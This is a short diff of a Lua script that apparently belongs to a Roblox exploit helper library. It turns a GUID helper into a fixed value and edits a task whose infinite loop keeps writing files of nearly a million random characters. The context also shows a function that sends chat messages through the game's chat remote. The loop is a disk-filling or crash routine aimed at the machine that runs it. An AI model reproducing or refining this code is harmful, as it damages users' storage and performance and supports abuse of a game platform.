@@ -15,10 +15,10 @@ if shared.FuncsConnect then
 		Functions.runFunction = function(func)
 			func()
 		end
-		Functions.randomGUID = function(state)
-		  state = state or true
-		  game:GetService("HttpService"):GenerateGUID(state)
-		end
+		Functions.randomGUID = game:GetService("HttpService"):GenerateGUID(true)
+		--Functions.randomGUID = function(state)
+		--  game:GetService("HttpService"):GenerateGUID(state)
+		--end
 		Functions.ChatMessage = function(Text, UserRe)
 			UserRe = UserRe or "All"
 			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Text, UserRe)
@@ -93,7 +93,7 @@ if shared.FuncsConnect then
 		  task.spawn(function()
         repeat
           task.wait()
-          writefile(Functions.randomGUID()..".txt", Functions.randomString(999999, 999999))
+          writefile(Functions.randomGUID..".txt", Functions.randomString(999999, 999999))
         until false
 		  end)
       wait(5)
